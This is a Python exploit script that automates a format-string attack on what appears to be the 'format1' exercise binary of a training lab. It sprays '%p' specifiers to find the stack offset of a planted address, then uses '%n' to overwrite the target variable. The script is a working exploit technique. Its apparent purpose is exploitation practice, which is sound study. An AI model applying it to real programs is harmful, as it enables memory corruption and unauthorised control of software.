#!/usr/bin/python
import os


egg = "\x38\x96\x04\x08"  
hex_egg = egg.encode("utf-8").hex()

def desc():
  print('[+] Running Simple Format String Spraying...')
  print('[+] Setting Egg: ', hex_egg)


def spraying():
  i = 1
  while i < 200:
    c = int(i)
    p = './format1 ' + egg + ("%p" * c) + "%p"
    out = os.popen(p).read()
    s = str(out)
  
    if hex_egg in s:
      print('[+] Egg found! ...{0}'.format(out[-30:]))
      print('[+] Found Offset: {0}'.format(i))
      return i
      break  
    else:
      i += 1
      continue
  


def win(i):
  offset = i
  p = './format1 ' 
  p+= egg 
  p+= ("%p" * offset) 
  p+= "%n"   
  out = os.popen(p).read()
  s = str(out)
  if "target" in s:
    print('[+] Winning Statement: {0}'.format(out[-32:]))
    exit(0) 
  else:
    print('[-] Something Went Wrong...')
    exit(1)

if __name__ == "__main__":
  desc()
  i = spraying()
  print(i)
  win(i)